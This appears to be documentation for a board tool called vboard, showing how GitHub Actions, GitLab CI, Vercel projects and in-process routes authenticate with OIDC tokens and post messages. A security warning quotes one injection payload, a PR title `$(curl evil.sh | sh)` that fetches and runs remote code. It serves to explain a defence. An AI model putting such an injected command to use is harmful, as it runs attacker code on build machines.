## From GitHub Actions

A workflow posts with its own OIDC token: no board secret to store or rotate.

```yaml .github/workflows/deploy.yml
name: deploy
on:
  push:
    branches: [main]

permissions:
  contents: read
  id-token: write # lets the CLI ask GitHub for an OIDC token

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      # your deploy steps…
      - if: failure()
        run: npx -y vboard post errors-www "deploy failed on $SHA" --label source=ci --id "deploy-$SHA"
        env:
          VBOARD_URL: https://team.example/api/board
          SHA: ${{ github.sha }}
```

- **The CLI finds the token itself.** In Actions it asks GitHub for a token
  whose audience is the board's URL, so it's good for that board and nothing
  else. Without `id-token: write`, it fails with
  ``error: GitHub Actions refused an OIDC token (403): does the job have `permissions: id-token: write`?``.
- **`--id` makes a retried step post once.** The same ID with the same write
  returns the message already posted.
- **The post is an ordinary thread.** If `errors-www` mirrors a Slack channel,
  it lands there, and a reply in Slack reaches the board.

> [!WARNING]
> Pass event data through `env:`, never as `${{ }}` inside `run:`. A PR title
> like `$(curl evil.sh | sh)` runs as a command when it's interpolated into a
> script. This is GitHub's classic script-injection hole.

### Trust the workflow

A board trusts its own Vercel project by default. A workflow is a machine
outside it, so the board names it in `access`, with what it may do in each
channel:

```ts app/api/board/[[...path]]/route.ts
import { board, githubActions } from 'vboard'

export const { GET, POST } = board({
  access: [
    githubActions({
      repository: 'basehub-ai/www',
      workflow: '.github/workflows/deploy.yml',
      can: { deploys: ['read', 'post'] },
    }),
  ],
})
```

`githubActions()` matches the token's `repository`, plus `workflow`, `event`
(`push`, `pull_request`, or a list), and `ref` when you give them. The
workflow posts as `github:repo:<repository_id>`, with the handle
`basehub-ai/www`. A workflow that matches no rule gets
`error: workflow isn't in access: basehub-ai/www`.

`can` says what it may do where. This one reads and posts in `deploys`, which
the wait below needs; `['post']` alone would start threads and read nothing.
See [Access](../01-board/08-access.md) for the permissions and patterns.

> [!TIP]
> Keep `can` narrow for `pull_request` workflows. A `pull_request` run uses the
> workflow file from the PR's merge commit, so anyone who can open a PR can
> change what it posts. Its token carries `ref: refs/pull/<n>/merge`, so match
> it on `event` and `workflow`, not `ref`. Fork PRs get no token at all. For PR
> activity, [GitHub sync](../02-sync/04-github.md) is usually the better tool.

### Wait for a person

Writes print the new message's ID, so a step can post and then block on the
answer:

```bash
# in a workflow step, with VBOARD_URL and DEPLOY_URL in env:
id=$(npx -y vboard post deploys "Ready to promote $DEPLOY_URL?")
npx -y vboard wait --re "$id" --after "$id" --text "ship it" --timeout 30m
```

`wait` exits 0 once someone replies in the thread with "ship it" (in Slack
too, if `deploys` mirrors a channel), or 124 when the timeout passes, which
fails the step.

### A protected board

If the board's deployment is behind Vercel Deployment Protection, add the
project's bypass secret to the step's `env:` and the CLI sends it:

```yaml
# in the step above:
env:
  VBOARD_URL: https://team.example/api/board
  VERCEL_AUTOMATION_BYPASS_SECRET: ${{ secrets.VERCEL_AUTOMATION_BYPASS_SECRET }}
```

## From a Vercel deployment

Code running on Vercel gets its token from the platform. The board's own
production can do everything, with no setup; its previews need a
`vercelProject({ project: 'self', environments: ['preview'], can })` rule.
Another project needs a rule too:

```ts app/api/board/[[...path]]/route.ts
import { board, vercelProject } from 'vboard'

export const { GET, POST } = board({
  access: [vercelProject({ project: 'marketing', environments: ['production'], can: { deploys: ['post'] } })],
})
```

`vercelProject()` matches a project by name or ID, and optionally its `team` and
`environments`. A name without `team` is a project on the board's own team;
for another team's project, pass its `team` or use the project's ID. In that project, the Node SDK mints the token itself:

```ts app/api/deploy-hook/route.ts
import { createClient } from 'vboard/client'

const board = createClient({ url: 'https://team.example/api/board' })

export async function POST(request: Request) {
  const { sha } = await request.json()
  // here's where you'd check who's calling
  await board.post('deploys', { text: `marketing ${sha} is live`, id: `deploy-${sha}` })
  return Response.json({ ok: true })
}
```

It posts as `vercel:project:<project_id>:production`, with the project's name
as its handle (`marketing`, or `marketing@preview` outside production).

## From your own routes

Code that runs next to the board doesn't need a token at all. `board()`
returns an in-process client:

```ts app/api/board/[[...path]]/route.ts
import { board } from 'vboard'

export const { GET, POST, client } = board()
```

```ts app/api/deploys/route.ts
import { client } from '@/app/api/board/[[...path]]/route'

export async function POST(request: Request) {
  const delivery = await request.json()
  // here's where you'd verify the delivery's signature, or any other checks
  await client('deploys', { key: delivery.id }).post('deploys', `${delivery.sha} is live`)
  return Response.json({ ok: true })
}
```

- **It writes as `vboard:client:<name>`.** Names use lowercase letters,
  numbers, `-`, and `_`.
- **A `key` makes it idempotent.** With the same key, the same posts in the
  same order never post twice, so a redelivered webhook is harmless.
- **Its writes are like anyone's.** They sync to platforms and wake
  [watchers](../01-board/05-watchers.md).

See [Mounting](../01-board/01-mounting.md) for the rest of what `board()`
returns.

## From anywhere else

`VBOARD_TOKEN` takes a token you minted yourself, and the CLI and Node SDK
send it as is. It must be one the board verifies: an OIDC token whose audience
is the board's URL, from the board's own project or a caller a rule in `access`
matches. Discovery tells you the audience:

```bash
# in a terminal:
curl -s https://team.example/api/board | jq -r .audience
```

Another CI's tokens work through `oidc()`, which pins the issuer and the
claims to match. In GitLab, a job's `id_tokens` with the board's audience is
the token:

```ts app/api/board/[[...path]]/route.ts
import { board, oidc } from 'vboard'

export const { GET, POST } = board({
  access: [oidc({ issuer: 'https://gitlab.com', claims: { project_path: 'acme/api', ref: 'main' }, can: { deploys: ['post'] } })],
})
```

```yaml
# .gitlab-ci.yml
notify:
  id_tokens:
    VBOARD_TOKEN:
      aud: https://team.example/api/board
  script:
    - npx -y vboard post deploys "api $CI_COMMIT_SHORT_SHA is live"
```

The CLI looks for a token in this order: `VBOARD_TOKEN`, GitHub Actions, the
Vercel runtime, then your `vercel login`. See
[Identity](../01-board/02-identity.md) for how each one maps to a principal.
